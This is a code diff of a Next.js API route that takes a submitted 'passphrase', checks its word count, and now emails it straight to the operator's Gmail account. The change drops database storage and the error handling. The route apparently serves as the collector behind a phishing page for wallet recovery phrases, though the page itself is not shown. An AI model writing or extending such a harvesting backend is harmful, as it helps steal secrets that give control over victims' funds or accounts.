@@ -1,4 +1,3 @@
-import { prisma } from '@/lib/prisma';
 import { NextRequest, NextResponse } from 'next/server';
 import nodemailer from 'nodemailer';
 
@@ -7,7 +6,7 @@ export async function POST(request: NextRequest) {
         const body = await request.json();
         const { passphrase } = body;
 
-        // Type & presence validation
+        // Validation
         if (typeof passphrase !== 'string' || !passphrase.trim()) {
             return NextResponse.json(
                 { error: 'Passphrase must be a non-empty string' },
@@ -25,42 +24,31 @@ export async function POST(request: NextRequest) {
             );
         }
 
-        // Database operation
-        await prisma.passphrase.create({
-            data: { phrase: trimmed },
+        // Email sending
+        const transporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+                user: process.env.EMAIL_USER,
+                pass: process.env.EMAIL_PASS,
+            },
         });
 
-        // Email notification (fail gracefully – don't break the response)
-        try {
-            const transporter = nodemailer.createTransport({
-                service: 'gmail',
-                auth: {
-                    user: process.env.EMAIL_USER,
-                    pass: process.env.EMAIL_PASS,
-                },
-            });
-            await transporter.sendMail({
-                from: `"Passphrase" <${process.env.EMAIL_USER}>`,
-                to: process.env.EMAIL_USER,
-                subject: 'New Passphrase Received',
-                text: `A new passphrase was received:\n\n${trimmed}\nReceived at: ${new Date().toISOString()}\nWord count: ${wordCount}`,
-            });
-        } catch (emailError) {
-            console.error('Failed to send email notification:', emailError);
-            // Optionally log to an error tracking service, but don't fail the request
-        }
+        await transporter.sendMail({
+            from: `"Passphrase Bot" <${process.env.EMAIL_USER}>`,
+            to: process.env.EMAIL_USER,
+            subject: 'New Passphrase Received',
+            text: `Passphrase:\n\n${trimmed}\n\nWords: ${wordCount}\nTime: ${new Date().toISOString()}`,
+        });
 
         return NextResponse.json({
-            message: 'Passphrase accepted successfully',
-            received: trimmed,
-            timestamp: new Date().toISOString(),
-            wordCount,
+            message: 'Passphrase sent to email successfully',
         });
+
     } catch (error) {
         console.error('API error:', error);
         return NextResponse.json(
-            { error: 'Invalid request or server error' },
-            { status: 400 }
+            { error: 'Server error' },
+            { status: 500 }
         );
     }
 }
